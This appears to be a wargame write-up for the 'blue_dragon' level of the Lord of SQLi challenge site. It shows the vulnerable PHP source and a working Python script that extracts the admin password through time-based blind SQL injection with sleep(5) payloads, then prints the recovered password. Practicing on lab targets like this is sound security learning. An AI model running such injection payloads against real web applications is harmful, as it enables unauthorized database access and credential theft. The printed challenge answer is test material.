---
title : "LOS Lv.27 blue_dragon"
categories : [Wargame, rubiya]
tags: [Time Based SQLi]
---


## blue_dragon
```php
query : select id from prob_blue_dragon where id='' and pw=''

<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\./i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/prob|_|\./i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_blue_dragon where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(preg_match('/\'|\\\/i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/\'|\\\/i', $_GET[pw])) exit("No Hack ~_~");
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>";

  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_blue_dragon where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("blue_dragon");
  highlight_file(__FILE__);
?>
```

## Solution
sleep 함수를 이용해 **Time based sql injection** 공격기법으로 확인.  
pw 길이는 8인걸 확인함.
```python
import requests
import time

url='https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php'
headers={'Content-Type':'application/x-www-form-urlencoded'}
cookies={'PHPSESSID':'spsjuudal7p9tejrd6bd2t8m3r'}

bit_val=''
pw=''

for i in range(1,9) :
    payload={'id':"' or id='admin' and length(bin(ascii(substr(pw,"+str(i)+",1))))=7 and sleep(5) #"}
    t1=time.time()
    res=requests.get(url,headers=headers, params=payload, cookies=cookies)
    t2=time.time()
    if t2-t1 > 5 :
        bit_len=7
    else :
        bit_len=6
    
    for j in range(1,bit_len+1) :
        payload={'id':"' or id='admin' and substr(bin(ascii(substr(pw,"+str(i)+",1))),"+str(j)+",1)=0 and sleep(5) #"}
        t3=time.time()
        res=requests.get(url,headers=headers, params=payload, cookies=cookies)
        t4=time.time()
        if t4-t3 > 5 :
            bit_val+='0'
        else :
            bit_val+='1'
    
    pw+=chr(int(bit_val,2))
    bit_val=''
    print("pw :",pw) # d948b8a0

print("BLUE_DRAGON CLEAR!")
```
```
1초 보다는 안전하게 5초로 하니까 바로 나옴.
2초 3초로 해봤는데 값이 계속 변함.
```
